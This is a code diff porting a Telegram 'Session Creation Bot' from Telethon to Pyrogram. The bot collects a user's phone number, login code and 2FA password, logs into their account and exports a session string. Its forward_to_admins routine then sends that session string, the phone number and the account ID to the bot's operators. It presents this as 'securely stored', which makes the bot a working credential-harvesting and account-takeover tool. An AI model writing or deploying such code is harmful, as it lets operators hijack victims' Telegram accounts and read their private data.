@@ -2,198 +2,219 @@ import os
 import asyncio
 import logging
 from typing import Dict, Optional
-from telethon import TelegramClient, events
-from telethon.sessions import StringSession
-from telethon.tl.types import User
+from pyrogram import Client, filters, idle
+from pyrogram.types import Message
+from pyrogram.errors import (
+    SessionPasswordNeeded, PhoneCodeInvalid, 
+    PhoneNumberInvalid, PhoneCodeExpired
+)
 import config
 
 # Configure logging
-logging.basicConfig(level=logging.INFO)
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+)
 logger = logging.getLogger(__name__)
 
 class SessionBot:
     def __init__(self):
-        self.bot = TelegramClient('session_bot', config.API_ID, config.API_HASH)
+        self.app = Client(
+            "session_bot",
+            api_id=config.API_ID,
+            api_hash=config.API_HASH,
+            bot_token=config.BOT_TOKEN
+        )
         self.user_sessions: Dict[int, Dict] = {}
         self.setup_handlers()
         
     def setup_handlers(self):
         """Setup bot command handlers"""
         
-        @self.bot.on(events.NewMessage(pattern='/start'))
-        async def start_handler(event):
+        @self.app.on_message(filters.command("start"))
+        async def start_handler(client, message: Message):
             """Start command handler"""
-            user_id = event.sender_id
-            await event.reply(
+            user_id = message.from_user.id
+            await message.reply_text(
                 "🤖 **Session Creation Bot**\n\n"
-                "I'll help you create a Telegram session file.\n\n"
+                "I'll help you create a Telegram session string.\n\n"
                 "**Available Commands:**\n"
                 "/create_session - Start session creation\n"
                 "/cancel - Cancel current operation\n\n"
-                "⚠️ **Note:** Your session files will be securely stored and forwarded to admins."
+                "⚠️ **Note:** Your session strings will be securely stored and forwarded to admins."
             )
         
-        @self.bot.on(events.NewMessage(pattern='/create_session'))
-        async def create_session_handler(event):
+        @self.app.on_message(filters.command("create_session"))
+        async def create_session_handler(client, message: Message):
             """Start session creation process"""
-            user_id = event.sender_id
+            user_id = message.from_user.id
             
             if user_id in self.user_sessions:
-                await event.reply("❌ You already have a session creation in progress!")
+                await message.reply_text("❌ You already have a session creation in progress!")
                 return
             
             # Initialize user session data
             self.user_sessions[user_id] = {
                 'step': 'phone',
                 'client': None,
-                'phone_code_hash': None
+                'phone_code_hash': None,
+                'phone_number': None
             }
             
-            await event.reply(
+            await message.reply_text(
                 "📱 **Session Creation Started**\n\n"
                 "Please send your phone number in international format:\n"
                 "Example: `+1234567890`\n\n"
                 "Use /cancel to stop the process."
             )
         
-        @self.bot.on(events.NewMessage(pattern='/cancel'))
-        async def cancel_handler(event):
+        @self.app.on_message(filters.command("cancel"))
+        async def cancel_handler(client, message: Message):
             """Cancel current operation"""
-            user_id = event.sender_id
+            user_id = message.from_user.id
             
             if user_id in self.user_sessions:
-                session_data = self.user_sessions[user_id]
-                if session_data['client']:
-                    await session_data['client'].disconnect()
-                del self.user_sessions[user_id]
-                await event.reply("❌ Operation cancelled.")
+                await self.cleanup_user_session(user_id)
+                await message.reply_text("❌ Operation cancelled.")
             else:
-                await event.reply("❌ No active operation to cancel.")
+                await message.reply_text("❌ No active operation to cancel.")
         
-        @self.bot.on(events.NewMessage)
-        async def message_handler(event):
+        @self.app.on_message(filters.text & filters.private)
+        async def message_handler(client, message: Message):
             """Handle all messages for session creation"""
-            user_id = event.sender_id
-            message_text = event.message.text
+            user_id = message.from_user.id
+            message_text = message.text
             
-            # Skip if not in session creation
-            if user_id not in self.user_sessions:
+            # Skip commands and if not in session creation
+            if message_text.startswith('/') or user_id not in self.user_sessions:
                 return
             
             session_data = self.user_sessions[user_id]
             
             try:
                 if session_data['step'] == 'phone':
-                    await self.handle_phone_number(event, session_data, message_text)
+                    await self.handle_phone_number(message, session_data, message_text)
                 
                 elif session_data['step'] == 'code':
-                    await self.handle_otp_code(event, session_data, message_text)
+                    await self.handle_otp_code(message, session_data, message_text)
                 
                 elif session_data['step'] == 'password':
-                    await self.handle_2fa(event, session_data, message_text)
+                    await self.handle_2fa(message, session_data, message_text)
                     
             except Exception as e:
                 logger.error(f"Error in session creation for user {user_id}: {e}")
-                await event.reply(f"❌ An error occurred: {str(e)}\n\nUse /create_session to try again.")
+                await message.reply_text(f"❌ An error occurred: {str(e)}\n\nUse /create_session to try again.")
                 await self.cleanup_user_session(user_id)
     
-    async def handle_phone_number(self, event, session_data, phone_number: str):
+    async def handle_phone_number(self, message: Message, session_data: Dict, phone_number: str):
         """Handle phone number input"""
         try:
             # Validate phone number format
             if not phone_number.startswith('+'):
-                await event.reply("❌ Please use international format starting with '+'")
+                await message.reply_text("❌ Please use international format starting with '+'")
                 return
             
-            # Create Telegram client
-            session = StringSession()
-            client = TelegramClient(session, config.API_ID, config.API_HASH)
-            session_data['client'] = client
+            # Create user client
+            user_client = Client(
+                f"user_session_{message.from_user.id}",
+                api_id=config.API_ID,
+                api_hash=config.API_HASH,
+                phone_number=phone_number
+            )
             
-            await client.connect()
+            await user_client.connect()
             
             # Send code request
-            sent_code = await client.send_code_request(phone_number)
+            sent_code = await user_client.send_code(phone_number)
+            
+            session_data['client'] = user_client
             session_data['phone_code_hash'] = sent_code.phone_code_hash
             session_data['phone_number'] = phone_number
             session_data['step'] = 'code'
             
-            await event.reply(
+            await message.reply_text(
                 "📨 **OTP Sent**\n\n"
                 "I've sent a verification code to your phone.\n"
                 "Please enter the code you received:\n\n"
                 "Format: `12345`"
             )
             
+        except PhoneNumberInvalid:
+            await message.reply_text("❌ Invalid phone number. Please check and try again.")
+            await self.cleanup_user_session(message.from_user.id)
         except Exception as e:
-            await event.reply(f"❌ Error sending code: {str(e)}\n\nUse /create_session to try again.")
-            await self.cleanup_user_session(event.sender_id)
+            await message.reply_text(f"❌ Error sending code: {str(e)}\n\nUse /create_session to try again.")
+            await self.cleanup_user_session(message.from_user.id)
     
-    async def handle_otp_code(self, event, session_data, code: str):
+    async def handle_otp_code(self, message: Message, session_data: Dict, code: str):
         """Handle OTP code input"""
         try:
             # Validate code format
-            if not code.isdigit():
-                await event.reply("❌ Please enter only numbers")
+            if not code.replace(' ', '').isdigit():
+                await message.reply_text("❌ Please enter only numbers")
                 return
             
             client = session_data['client']
+            code = code.replace(' ', '')
             
             # Sign in with code
             try:
                 await client.sign_in(
                     phone_number=session_data['phone_number'],
-                    code=code,
-                    phone_code_hash=session_data['phone_code_hash']
+                    phone_code_hash=session_data['phone_code_hash'],
+                    phone_code=code
                 )
                 
-            except Exception as e:
-                # Check if 2FA is required
-                if "two-steps" in str(e).lower():
-                    session_data['step'] = 'password'
-                    await event.reply(
-                        "🔐 **Two-Factor Authentication**\n\n"
-                        "Your account has 2FA enabled.\n"
-                        "Please enter your 2FA password:"
-                    )
-                    return
-                else:
-                    raise e
+            except SessionPasswordNeeded:
+                session_data['step'] = 'password'
+                await message.reply_text(
+                    "🔐 **Two-Factor Authentication**\n\n"
+                    "Your account has 2FA enabled.\n"
+                    "Please enter your 2FA password:"
+                )
+                return
+            except PhoneCodeInvalid:
+                await message.reply_text("❌ Invalid code. Please check and try again.")
+                return
+            except PhoneCodeExpired:
+                await message.reply_text("❌ Code expired. Please start over with /create_session")
+                await self.cleanup_user_session(message.from_user.id)
+                return
             
             # If no 2FA required, complete login
-            await self.complete_session_creation(event, session_data)
+            await self.complete_session_creation(message, session_data)
             
         except Exception as e:
-            await event.reply(f"❌ Error verifying code: {str(e)}\n\nUse /create_session to try again.")
-            await self.cleanup_user_session(event.sender_id)
+            await message.reply_text(f"❌ Error verifying code: {str(e)}\n\nUse /create_session to try again.")
+            await self.cleanup_user_session(message.from_user.id)
     
-    async def handle_2fa(self, event, session_data, password: str):
+    async def handle_2fa(self, message: Message, session_data: Dict, password: str):
         """Handle 2FA password input"""
         try:
             client = session_data['client']
             
             # Complete sign in with 2FA
-            await client.sign_in(password=password)
+            await client.check_password(password=password)
             
             # Complete session creation
-            await self.complete_session_creation(event, session_data)
+            await self.complete_session_creation(message, session_data)
             
         except Exception as e:
-            await event.reply(f"❌ Error with 2FA: {str(e)}\n\nUse /create_session to try again.")
-            await self.cleanup_user_session(event.sender_id)
+            await message.reply_text(f"❌ Error with 2FA: {str(e)}\n\nUse /create_session to try again.")
+            await self.cleanup_user_session(message.from_user.id)
     
-    async def complete_session_creation(self, event, session_data):
-        """Complete session creation and save file"""
-        user_id = event.sender_id
+    async def complete_session_creation(self, message: Message, session_data: Dict):
+        """Complete session creation and save session"""
+        user_id = message.from_user.id
         client = session_data['client']
         
         try:
             # Get user information
             me = await client.get_me()
-            session_string = client.session.save()
+            session_string = await client.export_session_string()
             
             # Create session file
-            filename = f"session_{user_id}_{me.id}.session"
+            filename = f"session_{user_id}_{me.id}.txt"
             filepath = os.path.join(config.SESSION_FOLDER, filename)
             
             # Ensure sessions directory exists
@@ -210,21 +231,22 @@ class SessionBot:
                 f"📱 **Phone:** {session_data['phone_number']}\n"
                 f"🆔 **User ID:** {me.id}\n"
                 f"📁 **Session File:** `{filename}`\n\n"
-                f"⚠️ **Keep your session file secure!**"
+                f"**Session String:**\n`{session_string}`\n\n"
+                f"⚠️ **Keep your session string secure!**"
             )
             
-            await event.reply(session_info)
+            await message.reply_text(session_info)
             
             # Forward session to admins
             await self.forward_to_admins(user_id, me, session_data['phone_number'], session_string, filename)
             
         except Exception as e:
             logger.error(f"Error completing session creation: {e}")
-            await event.reply("❌ Error saving session. Please try again.")
+            await message.reply_text("❌ Error saving session. Please try again.")
         finally:
             await self.cleanup_user_session(user_id)
     
-    async def forward_to_admins(self, bot_user_id: int, telegram_user: User, phone: str, session_string: str, filename: str):
+    async def forward_to_admins(self, bot_user_id: int, telegram_user, phone: str, session_string: str, filename: str):
         """Forward session information to admins"""
         try:
             session_info = (
@@ -240,14 +262,14 @@ class SessionBot:
             for admin_id in config.ADMIN_IDS:
                 try:
                     # Send session info
-                    await self.bot.send_message(admin_id, session_info)
+                    await self.app.send_message(admin_id, session_info)
                     
                     # Save session file and send as document
                     temp_file = f"temp_{filename}"
                     with open(temp_file, 'w') as f:
                         f.write(session_string)
                     
-                    await self.bot.send_file(
+                    await self.app.send_document(
                         admin_id,
                         temp_file,
                         caption=f"Session file: {filename}"
@@ -279,19 +301,20 @@ class SessionBot:
         os.makedirs(config.SESSION_FOLDER, exist_ok=True)
         
         logger.info("Starting Session Bot...")
-        await self.bot.start(bot_token=config.BOT_TOKEN)
+        await self.app.start()
         
-        me = await self.bot.get_me()
+        me = await self.app.get_me()
         logger.info(f"Bot started as @{me.username}")
         
         # Notify admins
         for admin_id in config.ADMIN_IDS:
             try:
-                await self.bot.send_message(admin_id, "🤖 Session Bot Started!")
+                await self.app.send_message(admin_id, "🤖 Session Bot Started!")
             except Exception as e:
                 logger.error(f"Could not notify admin {admin_id}: {e}")
         
-        await self.bot.run_until_disconnected()
+        await idle()
+        await self.app.stop()
 
 async def main():
     bot = SessionBot()
